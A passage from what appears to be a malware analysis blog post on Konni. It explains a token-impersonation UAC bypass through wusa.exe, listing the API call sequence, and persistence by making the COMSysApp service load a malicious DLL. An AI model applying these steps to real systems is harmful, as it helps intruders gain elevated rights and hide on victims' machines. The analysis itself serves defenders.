and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 501px"/><img alt="" class="bh md oi c" width="501" height="306" loading="lazy" role="presentation"/></picture></div><figcaption class="oj ff ok nv nw ol om bf b bg z du">1.bat: Checks for user’s permission</figcaption></figure><p id="335c" class="pw-post-body-paragraph mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt gn bk">mshlpweb.dll is a loader that uses a known token impersonation technique to elevate permissions and execute install.bat with high privileges. To gain higher privileges mshlpweb.dll execute the Windows Update Standalone Installer, wusa.exe. This process runs as a high-integrity process by default, since its set to auto-elevate within its manifest.</p><figure class="ny nz oa ob oc od nv nw paragraph-image"><div role="button" tabindex="0" class="oe of fj og bh oh"><div class="nv nw rm"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*2GjpFu43Q0BxoPiSa0Cy5A.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*2GjpFu43Q0BxoPiSa0Cy5A.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*2GjpFu43Q0BxoPiSa0Cy5A.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*2GjpFu43Q0BxoPiSa0Cy5A.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*2GjpFu43Q0BxoPiSa0Cy5A.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*2GjpFu43Q0BxoPiSa0Cy5A.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*2GjpFu43Q0BxoPiSa0Cy5A.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*2GjpFu43Q0BxoPiSa0Cy5A.png 640w, https://miro.medium.com/v2/resize:fit:720/1*2GjpFu43Q0BxoPiSa0Cy5A.png 720w, https://miro.medium.com/v2/resize:fit:750/1*2GjpFu43Q0BxoPiSa0Cy5A.png 750w, https://miro.medium.com/v2/resize:fit:786/1*2GjpFu43Q0BxoPiSa0Cy5A.png 786w, https://miro.medium.com/v2/resize:fit:828/1*2GjpFu43Q0BxoPiSa0Cy5A.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*2GjpFu43Q0BxoPiSa0Cy5A.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*2GjpFu43Q0BxoPiSa0Cy5A.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"/><img alt="" class="bh md oi c" width="700" height="432" loading="lazy" role="presentation"/></picture></div></div><figcaption class="oj ff ok nv nw ol om bf b bg z du">wusa.exe manifest, autoElevate set to true</figcaption></figure><p id="529d" class="pw-post-body-paragraph mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt gn bk">mshlpweb.dll contains an access token impersonation routine that duplicates the token of the high integrity instance of wusa.exe, and uses it to create a new cmd.exe process running under the security context of the impersonated user[<a class="af nu" href="https://attack.mitre.org/techniques/T1134/" rel="noopener ugc nofollow" target="_blank">2</a>], which in turn execute the installer — install.bat.</p><figure class="ny nz oa ob oc od nv nw paragraph-image"><div role="button" tabindex="0" class="oe of fj og bh oh"><div class="nv nw rn"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*lBZio6l1DWz25qftgHm3uQ.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*lBZio6l1DWz25qftgHm3uQ.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*lBZio6l1DWz25qftgHm3uQ.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*lBZio6l1DWz25qftgHm3uQ.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*lBZio6l1DWz25qftgHm3uQ.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*lBZio6l1DWz25qftgHm3uQ.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*lBZio6l1DWz25qftgHm3uQ.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*lBZio6l1DWz25qftgHm3uQ.png 640w, https://miro.medium.com/v2/resize:fit:720/1*lBZio6l1DWz25qftgHm3uQ.png 720w, https://miro.medium.com/v2/resize:fit:750/1*lBZio6l1DWz25qftgHm3uQ.png 750w, https://miro.medium.com/v2/resize:fit:786/1*lBZio6l1DWz25qftgHm3uQ.png 786w, https://miro.medium.com/v2/resize:fit:828/1*lBZio6l1DWz25qftgHm3uQ.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*lBZio6l1DWz25qftgHm3uQ.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*lBZio6l1DWz25qftgHm3uQ.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"/><img alt="" class="bh md oi c" width="700" height="522" loading="lazy" role="presentation"/></picture></div></div><figcaption class="oj ff ok nv nw ol om bf b bg z du">wusa.exe runs with high integrity</figcaption></figure><h2 id="5c3b" class="qb op gu bf oq qc qd dy ou qe qf ea oy nh qg qh qi nl qj qk ql np qm qn qo qp bk">Token Impersonation Routine</h2><p id="a9fc" class="pw-post-body-paragraph mw mx gu my b mz qq nb nc nd qr nf ng nh qs nj nk nl qt nn no np qu nr ns nt gn bk">mshlpweb.dll utilize a set of standard windows API calls to duplicate the token of wusa.exe and use it to spawn high integrity instance of cmd.exe. Higher privileges are needed to execute the installer, install.bat. The technique used by the threat actor is a full fileless UAC bypass named “Cavalry” that was leaked back in March 2017 to WikiLeaks as part of “Vault 7”, a series of leaks on the US CIA that included sophisticated privilege escalation techniques used by several actors in the wild since the leakage [<a class="af nu" href="https://wikileaks.org/ciav7p1/" rel="noopener ugc nofollow" target="_blank">3</a>]. This technique also bypasses UAC with the “AlwaysNotify” settings.</p><p id="593a" class="pw-post-body-paragraph mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt gn bk"><strong class="my gv">Technique flow:</strong></p><ul class=""><li id="5a2e" class="mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt qx qy qz bk">wusa.exe is executed in hidden window using ShellExecuteExW;</li><li id="3b78" class="mw mx gu my b mz ra nb nc nd rb nf ng nh rc nj nk nl rd nn no np re nr ns nt qx qy qz bk">Handle to the access token associated with wusa.exe is created.</li><li id="f095" class="mw mx gu my b mz ra nb nc nd rb nf ng nh rc nj nk nl rd nn no np re nr ns nt qx qy qz bk">The token object of wusa.exe is duplicated using DuplicateTokenEx. The threat actor pass “Token_all_access” as desired access, which combines all possible access rights for a token and creates a new impersonation token.</li></ul><figure class="ny nz oa ob oc od nv nw paragraph-image"><div class="nv nw ro"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*XMacEX_2bpfUnULdTj9V5g.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*XMacEX_2bpfUnULdTj9V5g.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*XMacEX_2bpfUnULdTj9V5g.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*XMacEX_2bpfUnULdTj9V5g.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*XMacEX_2bpfUnULdTj9V5g.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*XMacEX_2bpfUnULdTj9V5g.png 1100w, https://miro.medium.com/v2/resize:fit:714/format:webp/1*XMacEX_2bpfUnULdTj9V5g.png 714w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 357px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*XMacEX_2bpfUnULdTj9V5g.png 640w, https://miro.medium.com/v2/resize:fit:720/1*XMacEX_2bpfUnULdTj9V5g.png 720w, https://miro.medium.com/v2/resize:fit:750/1*XMacEX_2bpfUnULdTj9V5g.png 750w, https://miro.medium.com/v2/resize:fit:786/1*XMacEX_2bpfUnULdTj9V5g.png 786w, https://miro.medium.com/v2/resize:fit:828/1*XMacEX_2bpfUnULdTj9V5g.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*XMacEX_2bpfUnULdTj9V5g.png 1100w, https://miro.medium.com/v2/resize:fit:714/1*XMacEX_2bpfUnULdTj9V5g.png 714w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 357px"/><img alt="" class="bh md oi c" width="357" height="559" loading="lazy" role="presentation"/></picture></div></figure><ul class=""><li id="8756" class="mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt qx qy qz bk">New SID with medium privileges is created and set with NtSetInformationToken to the new duplicated token to lower its mandatory integrity level.</li><li id="a270" class="mw mx gu my b mz ra nb nc nd rb nf ng nh rc nj nk nl rd nn no np re nr ns nt qx qy qz bk">Restricted token is then created and duplicated using NtFilterToken and DuplicateTokenEx respectively.</li></ul><figure class="ny nz oa ob oc od nv nw paragraph-image"><div class="nv nw rp"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*Y-lfDHId6-_IJFiwp06W7A.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*Y-lfDHId6-_IJFiwp06W7A.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*Y-lfDHId6-_IJFiwp06W7A.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*Y-lfDHId6-_IJFiwp06W7A.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*Y-lfDHId6-_IJFiwp06W7A.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*Y-lfDHId6-_IJFiwp06W7A.png 1100w, https://miro.medium.com/v2/resize:fit:540/format:webp/1*Y-lfDHId6-_IJFiwp06W7A.png 540w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 270px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*Y-lfDHId6-_IJFiwp06W7A.png 640w, https://miro.medium.com/v2/resize:fit:720/1*Y-lfDHId6-_IJFiwp06W7A.png 720w, https://miro.medium.com/v2/resize:fit:750/1*Y-lfDHId6-_IJFiwp06W7A.png 750w, https://miro.medium.com/v2/resize:fit:786/1*Y-lfDHId6-_IJFiwp06W7A.png 786w, https://miro.medium.com/v2/resize:fit:828/1*Y-lfDHId6-_IJFiwp06W7A.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*Y-lfDHId6-_IJFiwp06W7A.png 1100w, https://miro.medium.com/v2/resize:fit:540/1*Y-lfDHId6-_IJFiwp06W7A.png 540w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 270px"/><img alt="" class="bh md oi c" width="270" height="592" loading="lazy" role="presentation"/></picture></div></figure><ul class=""><li id="24a8" class="mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt qx qy qz bk">The new duplicated token is passed to ImpersonateLoggedOnUser.</li><li id="2f9a" class="mw mx gu my b mz ra nb nc nd rb nf ng nh rc nj nk nl rd nn no np re nr ns nt qx qy qz bk">An elevated cmd instance is spawned using CreateProcessWithLogonW function. The credentials passed as arguments to the function (Username: aaa, Domain: bbb, Password: ccc) are identical to the credentials specified in the UAC bypass implementation by FuzzySecurity, UAC-TokenMagic [<a class="af nu" href="https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/UAC-TokenMagic.ps1" rel="noopener ugc nofollow" target="_blank">4</a>]</li></ul><figure class="ny nz oa ob oc od nv nw paragraph-image"><div class="nv nw rq"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*6Z5Vgmk0fmwc68sqmt3joQ.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*6Z5Vgmk0fmwc68sqmt3joQ.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*6Z5Vgmk0fmwc68sqmt3joQ.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*6Z5Vgmk0fmwc68sqmt3joQ.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*6Z5Vgmk0fmwc68sqmt3joQ.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*6Z5Vgmk0fmwc68sqmt3joQ.png 1100w, https://miro.medium.com/v2/resize:fit:660/format:webp/1*6Z5Vgmk0fmwc68sqmt3joQ.png 660w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 330px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*6Z5Vgmk0fmwc68sqmt3joQ.png 640w, https://miro.medium.com/v2/resize:fit:720/1*6Z5Vgmk0fmwc68sqmt3joQ.png 720w, https://miro.medium.com/v2/resize:fit:750/1*6Z5Vgmk0fmwc68sqmt3joQ.png 750w, https://miro.medium.com/v2/resize:fit:786/1*6Z5Vgmk0fmwc68sqmt3joQ.png 786w, https://miro.medium.com/v2/resize:fit:828/1*6Z5Vgmk0fmwc68sqmt3joQ.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*6Z5Vgmk0fmwc68sqmt3joQ.png 1100w, https://miro.medium.com/v2/resize:fit:660/1*6Z5Vgmk0fmwc68sqmt3joQ.png 660w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 330px"/><img alt="" class="bh md oi c" width="330" height="822" loading="lazy" role="presentation"/></picture></div></figure><p id="ba0d" class="pw-post-body-paragraph mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt gn bk">I used the James Forshaw’s excellent blog [<a class="af nu" href="https://tyranidslair.blogspot.com/2017/05/reading-your-way-around-uac-part-2.html" rel="noopener ugc nofollow" target="_blank">6</a>] explaining in detail how to bypass UAC using the technique above.</p><figure class="ny nz oa ob oc od nv nw paragraph-image"><div role="button" tabindex="0" class="oe of fj og bh oh"><div class="nv nw rr"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*5PpmVm4LnKJGwraa07uzdA.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*5PpmVm4LnKJGwraa07uzdA.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*5PpmVm4LnKJGwraa07uzdA.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*5PpmVm4LnKJGwraa07uzdA.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*5PpmVm4LnKJGwraa07uzdA.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*5PpmVm4LnKJGwraa07uzdA.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*5PpmVm4LnKJGwraa07uzdA.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*5PpmVm4LnKJGwraa07uzdA.png 640w, https://miro.medium.com/v2/resize:fit:720/1*5PpmVm4LnKJGwraa07uzdA.png 720w, https://miro.medium.com/v2/resize:fit:750/1*5PpmVm4LnKJGwraa07uzdA.png 750w, https://miro.medium.com/v2/resize:fit:786/1*5PpmVm4LnKJGwraa07uzdA.png 786w, https://miro.medium.com/v2/resize:fit:828/1*5PpmVm4LnKJGwraa07uzdA.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*5PpmVm4LnKJGwraa07uzdA.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*5PpmVm4LnKJGwraa07uzdA.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"/><img alt="" class="bh md oi c" width="700" height="503" loading="lazy" role="presentation"/></picture></div></div><figcaption class="oj ff ok nv nw ol om bf b bg z du">Konni 2nd stage and privilege escalation flow</figcaption></figure></div></div></div><div class="ab cb po pp pq pr" role="separator"><span class="ps by bm pt pu pv"></span><span class="ps by bm pt pu pv"></span><span class="ps by bm pt pu"></span></div><div class="gn go gp gq gr"><div class="ab cb"><div class="ci bh fz ga gb gc"><h2 id="129c" class="qb op gu bf oq qc qd dy ou qe qf ea oy nh qg qh qi nl qj qk ql np qm qn qo qp bk">Stage 3 — Persistence</h2><p id="dd0a" class="pw-post-body-paragraph mw mx gu my b mz qq nb nc nd qr nf ng nh qs nj nk nl qt nn no np qu nr ns nt gn bk">When the installer is executed, it first stops COMSysApp, a service that manages the configuration and tracking of Component Object Model (COM)-based components, using sc.exe utility.</p><ul class=""><li id="0037" class="mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt qx qy qz bk">COMSysApp service is first configured to autostart and the binpath of the service is set to svchost.exe.</li><li id="a786" class="mw mx gu my b mz ra nb nc nd rb nf ng nh rc nj nk nl rd nn no np re nr ns nt qx qy qz bk">COMSysApp service is added under the “SvcHost” key as a preliminary step to its execution in the context of svchost.exe.</li><li id="17e1" class="mw mx gu my b mz ra nb nc nd rb nf ng nh rc nj nk nl rd nn no np re nr ns nt qx qy qz bk">The malicious DLL is added as a service DLL of COMSysApp.</li><li id="6cb3" class="mw mx gu my b mz ra nb nc nd rb nf ng nh rc nj nk nl rd nn no np re nr ns nt qx qy qz bk">COMSysApp service is restarted.</li></ul><figure class="ny nz oa ob oc od nv nw paragraph-image"><div class="nv nw rs"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*WvlGglmi1doa33Kl-7RGiA.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*WvlGglmi1doa33Kl-7RGiA.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*WvlGglmi1doa33Kl-7RGiA.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*WvlGglmi1doa33Kl-7RGiA.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*WvlGglmi1doa33Kl-7RGiA.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*WvlGglmi1doa33Kl-7RGiA.png 1100w, https://miro.medium.com/v2/resize:fit:1336/format:webp/1*WvlGglmi1doa33Kl-7RGiA.png 1336w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 668px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*WvlGglmi1doa33Kl-7RGiA.png 640w, https://miro.medium.com/v2/resize:fit:720/1*WvlGglmi1doa33Kl-7RGiA.png 720w, https://miro.medium.com/v2/resize:fit:750/1*WvlGglmi1doa33Kl-7RGiA.png 750w, https://miro.medium.com/v2/resize:fit:786/1*WvlGglmi1doa33Kl-7RGiA.png 786w, https://miro.medium.com/v2/resize:fit:828/1*WvlGglmi1doa33Kl-7RGiA.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*WvlGglmi1doa33Kl-7RGiA.png 1100w, https://miro.medium.com/v2/resize:fit:1336/1*WvlGglmi1doa33Kl-7RGiA.png 1336w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 668px"/><img alt="" class="bh md oi c" width="668" height="307" loading="lazy" role="presentation"/></picture></div><figcaption class="oj ff ok nv nw ol om bf b bg z du">Install.bat: Persistence &amp; Execution of mshlpsrvc.dll</figcaption></figure><p id="6a8f" class="pw-post-body-paragraph mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt gn bk">Once COMSysApp service is restarted the malware is loaded in memory, and the batch file is removed from the infected system. The final payload (mshlpsrvc.dll), and its configuration file (mshlpsrvc.ini) are both copied into the system32 directory from the temp directory and then deleted.</p><figure class="ny nz oa ob oc od nv nw paragraph-image"><div class="nv nw rt"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*ZhBlz-szLDSH5kfSszPeZg.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*ZhBlz-szLDSH5kfSszPeZg.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*ZhBlz-szLDSH5kfSszPeZg.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*ZhBlz-szLDSH5kfSszPeZg.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*ZhBlz-szLDSH5kfSszPeZg.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*ZhBlz-szLDSH5kfSszPeZg.png 1100w, https://miro.medium.com/v2/resize:fit:980/format:webp/1*ZhBlz-szLDSH5kfSszPeZg.png 980w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 490px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*ZhBlz-szLDSH5kfSszPeZg.png 640w, https://miro.medium.com/v2/resize:fit:720/1*ZhBlz-szLDSH5kfSszPeZg.png 720w, https://miro.medium.com/v2/resize:fit:750/1*ZhBlz-szLDSH5kfSszPeZg.png 750w, https://miro.medium.com/v2/resize:fit:786/1*ZhBlz-szLDSH5kfSszPeZg.png 786w, https://miro.medium.com/v2/resize:fit:828/1*ZhBlz-szLDSH5kfSszPeZg.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*ZhBlz-szLDSH5kfSszPeZg.png 1100w, https://miro.medium.com/v2/resize:fit:980/1*ZhBlz-szLDSH5kfSszPeZg.png 980w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 490px"/><img alt="" class="bh md oi c" width="490" height="140" loading="lazy" role="presentation"/></picture></div><figcaption class="oj ff ok nv nw ol om bf b bg z du">Install.bat: files copied to System32 directory</figcaption></figure><figure class="ny nz oa ob oc od nv nw paragraph-image"><div class="nv nw ru"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*0ezU7eM3IHtVFsErY6Z57A.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*0ezU7eM3IHtVFsErY6Z57A.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*0ezU7eM3IHtVFsErY6Z57A.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*0ezU7eM3IHtVFsErY6Z57A.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*0ezU7eM3IHtVFsErY6Z57A.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*0ezU7eM3IHtVFsErY6Z57A.png 1100w, https://miro.medium.com/v2/resize:fit:1194/format:webp/1*0ezU7eM3IHtVFsErY6Z57A.png 